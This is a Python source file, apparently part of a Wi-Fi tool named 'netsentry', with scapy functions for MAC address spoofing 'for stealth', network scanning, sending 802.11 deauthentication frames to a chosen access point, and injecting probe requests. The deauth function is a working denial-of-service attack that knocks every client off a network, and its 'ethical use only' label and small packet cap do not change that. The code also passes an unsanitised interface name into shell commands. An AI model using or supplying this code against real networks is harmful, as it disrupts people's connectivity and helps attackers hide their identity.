import scapy.all as scapy
import os
import logging
import time
import subprocess
import re
from typing import Set, Tuple, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler("data/logs/netsentry.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def validate_mac(mac: str) -> bool:
    """Validate MAC address format."""
    return bool(re.match(r"^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$", mac))

def spoof_mac(interface: str, mac: str = "00:11:22:33:44:55") -> bool:
    """Spoof MAC address for stealth with validation and error handling."""
    try:
        if not validate_mac(mac):
            raise ValueError(f"Invalid MAC address format: {mac}")
        
        logger.info(f"Changing MAC address on {interface} to {mac}")
        
        commands = [
            f"sudo ifconfig {interface} down",
            f"sudo ifconfig {interface} hw ether {mac}",
            f"sudo ifconfig {interface} up"
        ]
        
        for cmd in commands:
            result = subprocess.run(
                cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            if result.returncode != 0:
                raise RuntimeError(f"Command failed: {cmd}\nError: {result.stderr.decode()}")
        
        # Verify MAC change
        time.sleep(1)
        current_mac = subprocess.check_output(f"ifconfig {interface} | grep ether", shell=True).decode()
        if mac.lower() not in current_mac.lower():
            raise RuntimeError(f"MAC address change verification failed. Current MAC: {current_mac}")
        
        logger.info(f"Successfully spoofed MAC to {mac}")
        return True
    
    except Exception as e:
        logger.error(f"MAC spoofing failed: {str(e)}")
        subprocess.run(f"sudo ifconfig {interface} up", shell=True)
        return False

def scan_wifi_networks(interface: str, timeout: int = 10) -> Set[Tuple[str, str]]:
    """Scan for Wi-Fi networks with comprehensive error handling."""
    networks = set()
    
    def packet_handler(packet):
        try:
            if packet.haslayer(scapy.Dot11Beacon) or packet.haslayer(scapy.Dot11ProbeResp):
                ssid = packet[scapy.Dot11Elt].info.decode('utf-8', errors='ignore') or "<Hidden SSID>"
                bssid = packet[scapy.Dot11].addr2
                if ssid and bssid and validate_mac(bssid):
                    networks.add((ssid.strip(), bssid))
        except Exception as e:
            logger.debug(f"Error processing packet: {str(e)}")

    try:
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Interface {interface} does not exist")
        
        logger.info(f"Scanning Wi-Fi networks on {interface} for {timeout} seconds...")
        start_time = time.time()
        
        scapy.sniff(
            iface=interface,
            prn=packet_handler,
            timeout=timeout,
            store=False,
            quiet=True
        )
        
        logger.info(f"Found {len(networks)} networks in {time.time() - start_time:.2f} seconds")
        return networks
    
    except Exception as e:
        logger.error(f"Wi-Fi scan failed: {str(e)}")
        return set()

def deauth_network(bssid: str, interface: str, count: int = 10) -> bool:
    """Send deauth packets with rate limiting and validation."""
    try:
        if not validate_mac(bssid):
            raise ValueError(f"Invalid BSSID format: {bssid}")
        
        if count > 20:
            logger.warning("Deauth count too high, limiting to 20 packets")
            count = 20
        
        logger.warning(f"Sending {count} deauth packets to {bssid} (ethical use only)")
        
        packet = (
            scapy.RadioTap() /
            scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
            scapy.Dot11Deauth()
        )
        
        scapy.sendp(
            packet,
            iface=interface,
            count=count,
            inter=0.2,
            verbose=False
        )
        logger.info(f"Successfully sent deauth packets to {bssid}")
        return True
    
    except Exception as e:
        logger.error(f"Deauth failed: {str(e)}")
        return False

def inject_probe(interface: str, count: int = 5) -> bool:
    """Inject probe requests with validation and rate limiting."""
    try:
        if count > 10:
            logger.warning("Probe count too high, limiting to 10 packets")
            count = 10
        
        logger.info(f"Injecting {count} probe requests on {interface}")
        
        probe = (
            scapy.RadioTap() /
            scapy.Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff") /
            scapy.Dot11ProbeReq()
        )
        
        scapy.sendp(
            probe,
            iface=interface,
            count=count,
            inter=0.3,
            verbose=False
        )
        logger.info(f"Successfully injected probe requests")
        return True
    
    except Exception as e:
        logger.error(f"Probe injection failed: {str(e)}")
        return False